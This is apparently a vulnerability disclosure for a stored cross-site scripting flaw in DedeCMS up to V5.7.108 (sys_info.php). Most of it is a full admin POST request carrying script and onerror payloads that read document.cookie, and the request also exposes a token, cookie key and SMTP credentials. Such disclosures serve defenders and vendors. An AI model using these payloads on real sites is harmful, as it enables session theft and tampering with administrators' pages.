DedeCMS up to V5.7.108 XSS vulnerability
The vulnerable file is sys_info.php and the vulnerable parameter is 'edit___cfg_powerby' and 'edit___cfg_beian'


POC below:

```
POST /dedecms/uploads/dede/sys_info.php HTTP/1.1
******************************************************

token=23aada1a3ad5a8dc6de2cecbf03c8e5e&dopost=save&edit___cfg_basehost=http%3A%2F%2F8.38.80.109&edit___cfg_indexurl=%2Fdedecms%2Fuploads&edit___cfg_indexname=%E4%B8%BB%E9%A1%B5&edit___cfg_webname=%E6%88%91%E7%9A%84%E7%BD%91%E7%AB%99&edit___cfg_arcdir=%2Fa&edit___cfg_medias_dir=%2Fuploads&edit___cfg_fck_xhtml=N&edit___cfg_df_style=default&edit___cfg_powerby=Copyright+%26copy%3B+2007-2021+%E4%B8%8A%E6%B5%B7%E5%8D%93%E5%8D%93%E7%BD%91%E7%BB%9C%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%0D%0A%3Cscript%3Ealert%28%27xss+again+hahaha%27%29%3C%2Fscript%3E&edit___cfg_keywords=&edit___cfg_description=&edit___cfg_beian=%3Cimg+src%3D1+onerror%3Dalert%28document.cookie%29%3E&edit___cfg_cmspath=%2Fdedecms%2Fuploads&edit___cfg_cookie_encode=C803vUgcGAwTNye55G9i8UwpXIMXNQ4&edit___cfg_backup_dir=backupdata&edit___cfg_adminemail=admin%40dedecms.com&edit___cfg_html_editor=wangEditor&edit___cfg_domain_cookie=&edit___cfg_specnote=6&edit___cfg_list_symbol=+%3E+&edit___cfg_keyword_replace=Y&edit___cfg_multi_site=N&edit___cfg_dede_log=N&edit___cfg_ftp_host=&edit___cfg_ftp_port=21&edit___cfg_ftp_user=&edit___cfg_ftp_pwd=&edit___cfg_ftp_root=%2F&edit___cfg_ftp_mkdir=N&edit___cfg_cli_time=8&edit___cfg_sendmail_bysmtp=Y&edit___cfg_smtp_server=smtp.qq.com&edit___cfg_smtp_port=25&edit___cfg_smtp_usermail=desdev%40vip.qq.com&edit___cfg_smtp_user=desdev&edit___cfg_smtp_password=desdev&edit___cfg_online_type=nps&edit___cfg_upload_switch=Y&edit___cfg_allsearch_limit=1&edit___cfg_rewrite=N&edit___cfg_delete=Y&edit___cfg_typedir_df=Y&edit___cfg_remote_site=N&edit___cfg_title_site=N&edit___cfg_mysql_type=mysql&edit___cfg_timeout_exit=1800&edit___cfg_archives_log=N&edit___cfg_fail_limit=5&edit___cfg_lock_time=3600&edit___cfg_ddimg_width=240&edit___cfg_ddimg_height=180&edit___cfg_imgtype=jpg%7Cgif%7Cpng&edit___cfg_softtype=zip%7Cgz%7Crar%7Ciso%7Cdoc%7Cxsl%7Cppt%7Cwps&edit___cfg_mediatype=swf%7Cmpg%7Cmp3%7Cmp4%7Crm%7Crmvb%7Cwmv%7Cwma%7Cwav%7Cmid%7Cmov&edit___cfg_album_width=800&edit___cfg_album_row=3&edit___cfg_album_col=4&edit___cfg_album_pagesize=12&edit___cfg_album_style=2&edit___cfg_album_ddwidth=200&edit___cfg_max_face=50&edit___cfg_addon_savetype=ymd&edit___cfg_qk_uploadlit=Y&edit___cfg_ddimg_full=N&edit___cfg_ddimg_bgcolor=0&edit___cfg_uplitpic_cut=Y&edit___cfg_album_mark=N&edit___cfg_mb_open=N&edit___cfg_mb_album=Y&edit___cfg_mb_upload=Y&edit___cfg_mb_upload_size=1024&edit___cfg_mb_sendall=Y&edit___cfg_mb_rmdown=Y&edit___cfg_mb_addontype=swf%7Cmpg%7Cmp3%7Cmp4%7Crm%7Crmvb%7Cwmv%7Cwma%7Cwav%7Cmid%7Cmov%7Czip%7Crar%7Cdoc%7Cxsl%7Cppt%7Cwps&edit___cfg_mb_max=500&edit___cfg_mb_notallow=www%2Cbbs%2Cftp%2Cmail%2Cuser%2Cusers%2Cadmin%2Cadministrator&edit___cfg_mb_idmin=3&edit___cfg_mb_pwdmin=3&edit___cfg_mb_pwdtype=32&edit___cfg_md_idurl=N&edit___cfg_mb_rank=10&edit___cfg_md_mailtest=N&edit___cfg_mb_spacesta=-10&edit___cfg_mb_allowncarc=Y&edit___cfg_mb_allowreg=Y&edit___cfg_mb_adminlock=N&edit___cfg_mb_spaceallarc=0&edit___cfg_mb_wnameone=N&edit___cfg_mb_feedcheck=N&edit___cfg_mb_msgischeck=N&edit___cfg_mb_reginfo=Y&edit___cfg_notallowstr=%E9%9D%9E%E5%85%B8%7C%E8%89%BE%E6%BB%8B%E7%97%85%7C%E9%98%B3%E7%97%BF&edit___cfg_replacestr=%E5%A5%B9%E5%A6%88%7C%E5%AE%83%E5%A6%88%7C%E4%BB%96%E5%A6%88%7C%E4%BD%A0%E5%A6%88%7C%E5%8E%BB%E6%AD%BB%7C%E8%B4%B1%E4%BA%BA&edit___cfg_feedbackcheck=N&edit___cfg_feedback_ck=Y&edit___cfg_feedback_time=30&edit___cfg_feedback_numip=30&edit___cfg_vdcode_member=Y&edit___cfg_mb_cktitle=Y&edit___cfg_mb_editday=7&edit___cfg_caicai_sub=2&edit___cfg_caicai_add=2&edit___cfg_feedback_add=5&edit___cfg_feedback_sub=5&edit___cfg_feedback_forbid=N&edit___cfg_sendarc_scores=10&edit___cfg_sendfb_scores=3&edit___cfg_face_adds=10&edit___cfg_moreinfo_adds=20&edit___cfg_money_scores=50&edit___cfg_login_adds=2&edit___cfg_userad_adds=10&edit___cfg_feedback_guest=N&edit___cfg_arcsptitle=N&edit___cfg_arcautosp=N&edit___cfg_arcautosp_size=5&edit___cfg_list_son=Y&edit___cfg_keyword_like=N&edit___cfg_index_max=10000&edit___cfg_index_cache=86400&edit___cfg_tplcache=Y&edit___cfg_tplcache_dir=%2Fdata%2Ftplcache&edit___cfg_makesign_cache=N&edit___cfg_search_max=50000&edit___cfg_search_maxrc=300&edit___cfg_search_time=3&edit___cfg_need_typeid2=Y&edit___cfg_cache_type=id&edit___cfg_makeindex=N&edit___cfg_make_andcat=N&edit___cfg_make_prenext=Y&edit___cfg_puccache_time=36000&edit___cfg_memcache_enable=N&edit___cfg_memcache_mc_defa=memcache%3A%2F%2F127.0.0.1%3A11211%2Fdefault127&edit___cfg_memcache_mc_oth=&edit___cfg_digg_update=0&edit___cfg_disable_funs=phpinfo%2Ceval%2Cassert%2Cexec%2Cpassthru%2Cshell_exec%2Csystem%2Cproc_open%2Cpopen%2Ccurl_exec%2Ccurl_multi_exec%2Cparse_ini_file%2Cshow_source%2Cfile_put_contents%2Cfsockopen%2Cfopen%2Cfwrite%2Cpreg_replace&edit___cfg_disable_tags=php&edit___cfg_auot_description=240&edit___cfg_rm_remote=Y&edit___cfg_arc_dellink=N&edit___cfg_arc_autopic=Y&edit___cfg_arc_autokeyword=Y&edit___cfg_title_maxlen=60&edit___cfg_check_title=Y&edit___cfg_jump_once=Y&edit___cfg_task_pwd=&edit___cfg_addon_domainbind=N&edit___cfg_addon_domain=&edit___cfg_df_dutyadmin=admin&edit___cfg_arc_dirname=Y&edit___cfg_arc_click=-1&edit___cfg_replace_num=2&edit___cfg_replace_total=0&edit___cfg_replace_sort=1&edit___cfg_sphinx_article=N&edit___cfg_sphinx_host=localhost&edit___cfg_sphinx_port=9312&edit___cfg_cross_sectypeid=N&edit___cfg_baidunews_limit=100&edit___cfg_updateperi=15&imageField.x=25&imageField.y=14

```


Reproduce:


![image](https://user-images.githubusercontent.com/55875284/232771877-fa6c6dd7-5dd4-4210-9715-0313c6ea40cb.png)



XSS triggered:




![image](https://user-images.githubusercontent.com/55875284/232771964-44cb7d1e-3e4a-42b4-b4cd-2a5b97e9d4aa.png)



![image](https://user-images.githubusercontent.com/55875284/232772027-f2e733f0-de52-48d1-9cca-09af71882a9a.png)


